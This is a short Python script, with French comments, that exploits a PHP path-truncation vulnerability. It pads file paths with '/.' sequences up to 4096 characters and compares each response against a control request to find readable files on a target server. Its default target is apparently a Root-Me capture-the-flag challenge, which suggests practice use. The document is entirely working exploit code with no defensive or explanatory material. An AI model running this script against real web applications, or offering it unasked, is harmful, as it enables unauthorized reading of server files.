"""
Script permettant d'exploiter une faille PHP path truncation
"""
import requests
import time

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"}


def path_truncation_exploit(url_base, filenameFile, prefix="a/../", injStr="/.", tempo=1):
    list_result = []
    with open(filenameFile, 'r') as rFile:
        filenameList = [x.strip() for x in rFile.readlines()]

    for filename in filenameList:
        chemin = prefix + filename
        while len(chemin) < 4096:
            chemin += injStr
            if len(chemin) == 4096 / 2 or len(chemin) == 4096 / 2 + 1:
                chemin_temoin = chemin
        rt = requests.get(url_base + chemin_temoin, headers=headers).text
        time.sleep(tempo / 2)
        r = requests.get(url_base + chemin, headers=headers).text
        if r != rt:
            list_result.append(url_base + chemin)
        time.sleep(tempo/2)
    return list_result


if __name__ == "__main__":
    print(path_truncation_exploit("http://challenge01.root-me.org/web-serveur/ch35/index.php?page=",
                                  filenameFile="test.txt"))
